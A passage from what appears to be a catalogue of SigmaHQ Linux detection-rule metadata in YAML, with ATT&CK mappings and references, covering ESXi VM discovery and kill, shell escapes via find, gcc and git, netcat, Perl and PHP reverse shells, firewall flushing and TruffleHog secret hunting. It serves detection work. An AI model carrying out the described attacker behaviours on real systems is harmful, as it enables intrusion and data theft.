  - https://developer.broadcom.com/xapis/esxcli-command-reference/7.0.0/namespace/esxcli_system.html
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 5f1573a7-363b-4114-9208-ad7a61de46eb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_vm_discovery.yml
  name: ESXi VM List Discovery Via ESXCLI
  description: Detects execution of the "esxcli" command with the "vm" flag in order
    to retrieve information about the installed VMs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1007
  - T1033
  - T1059.012
  tags:
  - attack.discovery
  - attack.execution
  - attack.t1033
  - attack.t1007
  - attack.t1059.012
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/
  - https://developer.broadcom.com/xapis/esxcli-command-reference/7.0.0/namespace/esxcli_vm.html
  - https://www.secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware/
  - https://www.trendmicro.com/en_us/research/22/e/new-linux-based-ransomware-cheerscrypt-targets-exsi-devices.html
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 2992ac4d-31e9-4325-99f2-b18a73221bb2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_vm_kill.yml
  name: ESXi VM Kill Via ESXCLI
  description: Detects execution of the "esxcli" command with the "vm" and "kill"
    flag in order to kill/shutdown a specific VM.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Impact
  techniques:
  - T1059.012
  - T1529
  tags:
  - attack.execution
  - attack.impact
  - attack.t1059.012
  - attack.t1529
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/
  - https://developer.broadcom.com/xapis/esxcli-command-reference/7.0.0/namespace/esxcli_vm.html
  - https://www.secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware/
  - https://www.trendmicro.com/en_us/research/22/e/new-linux-based-ransomware-cheerscrypt-targets-exsi-devices.html
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: d54c2f06-aca9-4e2b-81c9-5317858f4b79
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_vsan_discovery.yml
  name: ESXi VSAN Information Discovery Via ESXCLI
  description: Detects execution of the "esxcli" command with the "vsan" flag in order
    to retrieve information about virtual storage. Seen used by malware such as DarkSide.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1007
  - T1033
  - T1059.012
  tags:
  - attack.discovery
  - attack.execution
  - attack.t1033
  - attack.t1007
  - attack.t1059.012
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/21/e/darkside-linux-vms-targeted.html
  - https://www.trendmicro.com/en_us/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html
  - https://developer.broadcom.com/xapis/esxcli-command-reference/7.0.0/namespace/esxcli_vsan.html
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_file_and_directory_discovery.yml
  name: File and Directory Discovery - Linux
  description: 'Detects usage of system utilities such as "find", "tree", "findmnt",
    etc, to discover files, directories and network shares.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: informational
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1083/T1083.md
  false_positives:
  - Legitimate activities
  notes: ''
- detection_id: 30aed7b6-d2c1-4eaf-9382-b6bc43e50c57
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_file_deletion.yml
  name: File Deletion
  description: Detects file deletion using "rm", "shred" or "unlink" commands which
    are used often by adversaries to delete files left behind by the actions of their
    intrusion activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: informational
  status: stable
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070.004
  tags:
  - attack.defense-evasion
  - attack.t1070.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 6adfbf8f-52be-4444-9bac-81b539624146
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_find_shell_execution.yml
  name: Shell Execution via Find - Linux
  description: 'Detects the use of the find command to execute a shell. Such behavior
    may be associated with privilege escalation, unauthorized command execution, or
    exploitation attempt.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://gtfobins.github.io/gtfobins/find/#shell
  - https://www.elastic.co/guide/en/security/current/linux-restricted-shell-breakout-via-linux-binary-s.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4b09c71e-4269-4111-9cdd-107d8867f0cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_flock_shell_execution.yml
  name: Shell Execution via Flock - Linux
  description: 'Detects the use of the "flock" command to execute a shell. Such behavior
    may be associated with privilege escalation, unauthorized command execution, or
    to break out from restricted environments.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://gtfobins.github.io/gtfobins/flock/#shell
  - https://www.elastic.co/guide/en/security/current/linux-restricted-shell-breakout-via-linux-binary-s.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9b5de532-a757-4d70-946c-1f3e44f48b4d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_gcc_shell_execution.yml
  name: Shell Execution GCC  - Linux
  description: 'Detects the use of the "gcc" utility to execute a shell. Such behavior
    may be associated with privilege escalation, unauthorized command execution, or
    to break out from restricted environments.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://gtfobins.github.io/gtfobins/gcc/#shell
  - https://gtfobins.github.io/gtfobins/c89/#shell
  - https://gtfobins.github.io/gtfobins/c99/#shell
  - https://www.elastic.co/guide/en/security/current/linux-restricted-shell-breakout-via-linux-binary-s.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 47b3bbd4-1bf7-48cc-84ab-995362aaa75a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_git_shell_execution.yml
  name: Shell Execution via Git - Linux
  description: 'Detects the use of the "git" utility to execute a shell. Such behavior
    may be associated with privilege escalation, unauthorized command execution, or
    to break out from restricted environments.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://gtfobins.github.io/gtfobins/git/#shell
  false_positives:
  - Unknown
  notes: ''
- detection_id: d27ab432-2199-483f-a297-03633c05bae6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_grep_os_arch_discovery.yml
  name: OS Architecture Discovery Via Grep
  description: 'Detects the use of grep to identify information about the operating
    system architecture. Often combined beforehand with the execution of "uname" or
    "cat /proc/cpuinfo"

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - multi_signal_correlation
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html
  - https://jstnk9.github.io/jstnk9/research/GobRAT-Malware/
  - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection
  - https://www.virustotal.com/gui/file/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1/detection
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8a46f16c-8c4c-82d1-b121-0fdd3ba70a84
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_groupdel.yml
  name: Group Has Been Deleted Via Groupdel
  description: Detects execution of the "groupdel" binary. Which is used to delete
    a group. This is sometimes abused by threat actors in order to cover their tracks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1531
  tags:
  - attack.impact
  - attack.t1531
  time_window: ''
  references:
  - https://linuxize.com/post/how-to-delete-group-in-linux/
  - https://www.cyberciti.biz/faq/linux-remove-user-command/
  - https://www.cybrary.it/blog/0p3n/linux-commands-used-attackers/
  - https://linux.die.net/man/8/groupdel
  false_positives:
  - Legitimate administrator activities
  notes: ''
- detection_id: 78a80655-a51e-4669-bc6b-e9d206a462ee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_install_root_certificate.yml
  name: Install Root Certificate
  description: Detects installation of new certificate on the system which attackers
    may use to avoid warnings when connecting to controlled web servers or C2s
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1553.004
  tags:
  - attack.defense-evasion
  - attack.t1553.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 700fb7e8-2981-401c-8430-be58e189e741
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_install_suspicious_packages.yml
  name: Suspicious Package Installed - Linux
  description: Detects installation of suspicious packages using system installation
    utilities
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1553.004
  tags:
  - attack.defense-evasion
  - attack.t1553.004
  time_window: ''
  references:
  - https://gist.githubusercontent.com/MichaelKoczwara/12faba9c061c12b5814b711166de8c2f/raw/e2068486692897b620c25fde1ea258c8218fe3d3/history.txt
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 3be619f4-d9ec-4ea8-a173-18fdd01996ab
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_iptables_flush_ufw.yml
  name: Flush Iptables Ufw Chain
  description: Detect use of iptables to flush all firewall rules, tables and chains
    and allow all network traffic
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://blogs.blackberry.com/
  - https://www.cyberciti.biz/tips/linux-iptables-how-to-flush-all-rules.html
  - https://twitter.com/Joseliyo_Jstnk/status/1620131033474822144
  false_positives:
  - Network administrators
  notes: ''
- detection_id: b45e3d6f-42c6-47d8-a478-df6bd6cf534c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_local_account.yml
  name: Local System Accounts Discovery - Linux
  description: Detects enumeration of local system accounts. This information can
    help adversaries determine which local accounts exist on a system to aid in follow-on
    behavior.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1087.001
  tags:
  - attack.discovery
  - attack.t1087.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1087.001/T1087.001.md
  - https://my.f5.com/manage/s/article/K589
  - https://man.freebsd.org/cgi/man.cgi?pwd_mkdb
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 676381a6-15ca-4d73-a9c8-6a22e970b90d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_local_groups.yml
  name: Local Groups Discovery - Linux
  description: Detects enumeration of local system groups. Adversaries may attempt
    to find local system groups and permission settings
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.001
  tags:
  - attack.discovery
  - attack.t1069.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1069.001/T1069.001.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: e34cfa0c-0a50-4210-9cb3-5632d08eb041
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_malware_gobrat_grep_payload_discovery.yml
  name: Potential GobRAT File Discovery Via Grep
  description: Detects the use of grep to discover specific files created by the GobRAT
    malware
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html
  - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection
  - https://www.virustotal.com/gui/file/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1/detection
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9d779ce8-5256-4b13-8b6f-b91c602b43f4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_mkfifo_named_pipe_creation.yml
  name: Named Pipe Created Via Mkfifo
  description: Detects the creation of a new named pipe using the "mkfifo" utility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://dev.to/0xbf/use-mkfifo-to-create-named-pipe-linux-tips-5bbk
  - https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally
  false_positives:
  - Unknown
  notes: ''
- detection_id: 999c3b12-0a8c-40b6-8e13-dd7d62b75c7a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_mkfifo_named_pipe_creation_susp_location.yml
  name: Potentially Suspicious Named Pipe Created Via Mkfifo
  description: Detects the creation of a new named pipe using the "mkfifo" utility
    in a potentially suspicious location
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://dev.to/0xbf/use-mkfifo-to-create-named-pipe-linux-tips-5bbk
  - https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally
  false_positives:
  - Unknown
  notes: ''
- detection_id: ec52985a-d024-41e3-8ff6-14169039a0b3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_mount_hidepid.yml
  name: Mount Execution With Hidepid Parameter
  description: Detects execution of the "mount" command with "hidepid" parameter to
    make invisible processes to other users from the system
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564
  tags:
  - attack.credential-access
  - attack.defense-evasion
  - attack.t1564
  time_window: ''
  references:
  - https://blogs.blackberry.com/
  - https://www.cyberciti.biz/faq/linux-hide-processes-from-other-users/
  - https://twitter.com/Joseliyo_Jstnk/status/1620131033474822144
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7f734ed0-4f47-46c0-837f-6ee62505abd9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_netcat_reverse_shell.yml
  name: Potential Netcat Reverse Shell Execution
  description: Detects execution of netcat with the "-e" flag followed by common shells.
    This could be a sign of a potential reverse shell setup.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  - https://www.revshells.com/
  - https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/
  - https://www.infosecademy.com/netcat-reverse-shells/
  - https://man7.org/linux/man-pages/man1/ncat.1.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 093d68c7-762a-42f4-9f46-95e79142571a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_nice_shell_execution.yml
  name: Shell Execution via Nice - Linux
  description: 'Detects the use of the "nice" utility to execute a shell. Such behavior
    may be associated with privilege escalation, unauthorized command execution, or
    to break out from restricted environments.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://gtfobins.github.io/gtfobins/nice/#shell
  - https://www.elastic.co/guide/en/security/current/linux-restricted-shell-breakout-via-linux-binary-s.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: e4ffe466-6ff8-48d4-94bd-e32d1a6061e2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_nohup.yml
  name: Nohup Execution
  description: Detects usage of nohup which could be leveraged by an attacker to keep
    a process running or break out from restricted environments
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.004
  tags:
  - attack.execution
  - attack.t1059.004
  time_window: ''
  references:
  - https://gtfobins.github.io/gtfobins/nohup/
  - https://en.wikipedia.org/wiki/Nohup
  - https://www.computerhope.com/unix/unohup.htm
  false_positives:
  - Administrators or installed processes that leverage nohup
  notes: ''
- detection_id: 457df417-8b9d-4912-85f3-9dbda39c3645
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_nohup_susp_execution.yml
  name: Suspicious Nohup Execution
  description: Detects execution of binaries located in potentially suspicious locations
    via "nohup"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html
  - https://jstnk9.github.io/jstnk9/research/GobRAT-Malware/
  - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection
  - https://www.virustotal.com/gui/file/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1/detection
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6eea1bf6-f8d2-488a-a742-e6ef6c1b67db
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_omigod_scx_runasprovider_executescript.yml
  name: OMIGOD SCX RunAsProvider ExecuteScript
  description: 'Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute
    any UNIX/Linux script using the /bin/sh shell.

    Script being executed gets created as a temp file in /tmp folder with a scx* prefix.

    Then it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/.

    The file in that directory has the same prefix scx*. SCXcore, started as the Microsoft
    Operations Manager UNIX/Linux Agent, is now used in a host of products including

    Microsoft Operations Manager, Microsoft Azure, and Microsoft Operations Management
    Suite.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1068
  - T1190
  - T1203
  tags:
  - attack.privilege-escalation
  - attack.initial-access
  - attack.execution
  - attack.t1068
  - attack.t1190
  - attack.t1203
  time_window: ''
  references:
  - https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure
  - https://github.com/Azure/Azure-Sentinel/pull/3059
  false_positives:
  - Legitimate use of SCX RunAsProvider ExecuteScript.
  notes: ''
- detection_id: 21541900-27a9-4454-9c4c-3f0a4240344a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_omigod_scx_runasprovider_executeshellcommand.yml
  name: OMIGOD SCX RunAsProvider ExecuteShellCommand
  description: 'Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand
    to execute any UNIX/Linux command using the /bin/sh shell.

    SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now
    used in a host of products including

    Microsoft Operations Manager, Microsoft Azure, and Microsoft Operations Management
    Suite.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1068
  - T1190
  - T1203
  tags:
  - attack.privilege-escalation
  - attack.initial-access
  - attack.execution
  - attack.t1068
  - attack.t1190
  - attack.t1203
  time_window: ''
  references:
  - https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure
  - https://github.com/Azure/Azure-Sentinel/pull/3059
  false_positives:
  - Legitimate use of SCX RunAsProvider Invoke_ExecuteShellCommand.
  notes: ''
- detection_id: 259df6bc-003f-4306-9f54-4ff1a08fa38e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_perl_reverse_shell.yml
  name: Potential Perl Reverse Shell Execution
  description: Detects execution of the perl binary with the "-e" flag and common
    strings related to potential reverse shell activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  - https://www.revshells.com/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c6714a24-d7d5-4283-a36b-3ffd091d5f7e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_php_reverse_shell.yml
  name: Potential PHP Reverse Shell
  description: 'Detects usage of the PHP CLI with the "-r" flag which allows it to
    run inline PHP code. The rule looks for calls to the "fsockopen" function which
    allows the creation of sockets.

    Attackers often leverage this in combination with functions such as "exec" or
    "fopen" to initiate a reverse shell connection.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  - https://www.revshells.com/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 97de11cd-4b67-4abf-9a8b-1020e670aa9e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_pnscan_binary_cli_pattern.yml
  name: Pnscan Binary Data Transmission Activity
  description: 'Detects command line patterns associated with the use of Pnscan for
    sending and receiving binary data across the network.

    This behavior has been identified in a Linux malware campaign targeting Docker,
    Apache Hadoop, Redis, and Confluence and was previously used by the threat actor
    known as TeamTNT

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1046
  tags:
  - attack.discovery
  - attack.t1046
  time_window: ''
  references:
  - https://www.cadosecurity.com/blog/spinning-yarn-a-new-linux-malware-campaign-targets-docker-apache-hadoop-redis-and-confluence
  - https://intezer.com/wp-content/uploads/2021/09/TeamTNT-Cryptomining-Explosion.pdf
  - https://regex101.com/r/RugQYK/1
  - https://www.virustotal.com/gui/file/beddf70a7bab805f0c0b69ac0989db6755949f9f68525c08cb874988353f78a9/content
  false_positives:
  - Unknown
  notes: ''
- detection_id: 72f4ab3f-787d-495d-a55d-68c2ff46cf4c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_proxy_connection.yml
  name: Connection Proxy
  description: Detects setting proxy configuration
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  - attack.t1090
  time_window: ''
  references: []
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: d7a650c4-226c-451e-948f-cc490db506aa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_pua_trufflehog.yml
  name: PUA - TruffleHog Execution - Linux
  description: 'Detects execution of TruffleHog, a tool used to search for secrets
    in different platforms like Git, Jira, Slack, SharePoint, etc. that could be used
    maliciously.

    While it is a legitimate tool, intended for use in CI pipelines and security assessments,

    It was observed in the Shai-Hulud malware campaign targeting npm packages to steal
    sensitive information.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  - T1552.001
  tags:
